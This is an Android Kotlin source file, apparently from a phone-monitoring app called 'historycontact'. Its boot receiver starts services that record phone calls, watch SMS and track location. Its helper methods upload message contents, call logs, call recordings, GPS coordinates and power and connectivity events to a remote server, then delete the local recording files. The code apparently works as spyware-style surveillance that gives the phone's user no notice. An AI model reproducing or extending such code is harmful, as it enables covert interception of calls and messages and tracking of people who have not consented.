package an.xuan.tong.historycontact.smsradar.Receiver

import an.xuan.tong.historycontact.Constant
import an.xuan.tong.historycontact.api.ApiService
import an.xuan.tong.historycontact.api.Repository
import an.xuan.tong.historycontact.api.model.CallLogServer
import an.xuan.tong.historycontact.api.model.PowerAndInternet
import an.xuan.tong.historycontact.api.model.SmsSendServer
import an.xuan.tong.historycontact.call.CallRecord
import an.xuan.tong.historycontact.location.LocationService
import an.xuan.tong.historycontact.realm.RealmUtils
import an.xuan.tong.historycontact.smsradar.SmsRadarService
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.os.Build
import android.os.Environment
import android.util.Log
import com.facebook.accountkit.Account
import com.facebook.accountkit.AccountKit
import com.facebook.accountkit.AccountKitCallback
import com.facebook.accountkit.AccountKitError
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody
import java.io.File
import java.text.SimpleDateFormat
import java.util.*


class SMSreceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if ("android.intent.action.BOOT_COMPLETED" == intent.action) {
            Log.e("antx", "onReceive sms BOOT_COMPLETED")
            //Handler Power
            RealmUtils.savePowerOnOff(true)

            //  updateInformation()
            val intentSms = Intent(context, SmsRadarService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intentSms)
            } else {
                context.startService(intentSms)
            }
            //Call
            var callRecord = CallRecord.Builder(context)
                    .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
                    .setRecordDirName("Historycontact")
                    .setRecordDirPath(Environment.getExternalStorageDirectory().path)
                    .setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                    .setShowSeed(true)
                    .build()

            callRecord.startCallRecordService()

            val intent = Intent()
            intent.setClass(context, LocationService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }

        }
        //Location

        if ("android.intent.action.QUICKBOOT_POWEROFF" == intent.action) {
            Log.e("antx", "onReceive sms QUICKBOOT_POWEROFF")
            RealmUtils.savePowerOnOff(false)
        }
        if ("android.intent.action.ACTION_SHUTDOWN" == intent.action) {
            Log.e("antx", "onReceive sms ACTION_SHUTDOWN")
            RealmUtils.savePowerOnOff(false)
            //ACTION_SHUTDOWN
        }
    }

    private fun isOnline(context: Context): Boolean {
        try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val netInfo = cm.activeNetworkInfo
            //should check null because in airplane mode it will be null
            return netInfo != null && netInfo.isConnected
        } catch (e: NullPointerException) {
            e.printStackTrace()
            return false
        }

    }

    //file audio local
    private fun sendCallFail(realmId: Int?, phoneNumber: String?, dateCreate: String?, duration: String?, fileAAudio: String?, lat: String?, lng: String?, type: String?, filePath: String? = "") {
        val result: HashMap<String, String> = HashMap()
        result["Authorization"] = RealmUtils.getAuthorization()
        var id = RealmUtils.getAccountId()
        var message = CallLogServer(id, phoneNumber,
                dateCreate, duration, lat, lng, fileAAudio, type.toString())
        id?.let {
            Repository.createService(ApiService::class.java, result).insertCallLog(message.toMap(), Constant.KEY_API)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            {
                                RealmUtils.deleteItemCachingCallLog(realmId)
                                try {
                                    val fdelete = File(filePath)
                                    fdelete.delete()
                                } catch (e: Exception) {

                                }
                                Log.e("antx", "sendCallFail sucess")

                            },
                            { e ->
                                Log.e("antx", "sendCallFail error" + e.message)
                            })

        }
    }

    //file audio server
    private fun sendRecoderToServer(realmID: Int?, filePath: String?, number: String?, dataCreate: String?, duaration: String?, lat: String?, lng: String?, typeCall: String? = "null") {
        try {
            val file = File(filePath)
            val result: HashMap<String, String> = HashMap()
            result["Authorization"] = RealmUtils.getAuthorization()
            var id = RealmUtils.getAccountId()
            val temp = RequestBody.create(MediaType.parse("multipart/form-data"), file)
            var imageFile = MultipartBody.Part.createFormData(file.name, file.name, temp)
            Repository.createService(ApiService::class.java, result).insertUpload(Constant.KEY_API, id, imageFile)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            { result ->
                                if (result.isNotEmpty()) {
                                    sendCallFail(realmID, number, dataCreate, duaration, result[0], lat, lng, typeCall.toString(), filePath)
                                }
                            },
                            { e ->
                                Log.e("test", "sendRcoderToServer  error " + e.message)
                            })
        } catch (e: Exception) {
            Log.e("antx Exception", "sendRcoderToServer " + e.message)
        }

    }

    private fun insertCachingSms(cachingId: Int?, phoneNunber: String?, datecreate: String?, contentmessage: String?, lat: String?, lng: String?, type: Boolean?) {
        val result: HashMap<String, String> = HashMap()
        result["Authorization"] = RealmUtils.getAuthorization()
        var id = RealmUtils.getAccountId()
        var message = SmsSendServer(id, phoneNunber,
                datecreate, lat, lng, contentmessage, type)
        Log.e("datatCachingSms", " " + message.toString())
        id?.let {
            Repository.createService(ApiService::class.java, result).insertMessage(message.toMap(), Constant.KEY_API)
                    .subscribeOn(Schedulers.io())
                    .retry(3)
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            { result ->
                                RealmUtils.deleteItemCachingMess(cachingId)
                            },
                            { e ->
                                Log.e("antx", "insertCachingSms eror " + e.message)
                            })
        }
    }

    private fun sendInternetCaching(cachingId: Int?, dateCreate: String?, status: Boolean?) {
        val result: HashMap<String, String> = HashMap()
        result["Authorization"] = RealmUtils.getAuthorization()
        var id = RealmUtils.getAccountId()
        var message = PowerAndInternet(id, dateCreate, status)
        Log.e("datatCachingSms", " " + message.toString())
        id?.let {
            Repository.createService(ApiService::class.java, result).insertInternet(message.toMap(), Constant.KEY_API)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            {
                                RealmUtils.deleteItemInternet(cachingId)
                            },
                            { e ->
                                Log.e("antx", "sendInternetCaching eror " + e.message)
                            })
        }
    }



    private fun updateInformation() {
        AccountKit.getCurrentAccount(object : AccountKitCallback<Account> {
            override fun onSuccess(account: Account) {
                account.phoneNumber?.let {
                    Repository.createService(ApiService::class.java).getInfomation(Constant.KEY_API, account.phoneNumber.toString())
                            .subscribeOn(Schedulers.io())
                            .retry(3)
                            .observeOn(AndroidSchedulers.mainThread())
                            .subscribe(
                                    { result ->
                                        Log.e("test", result.toString())
                                        RealmUtils.saveCacheInformation(result)

                                    },
                                    { e ->
                                        Log.e("test", e.message)

                                    })

                }
                account.email?.let {
                }
            }

            override fun onError(error: AccountKitError) {}
        })
    }
}
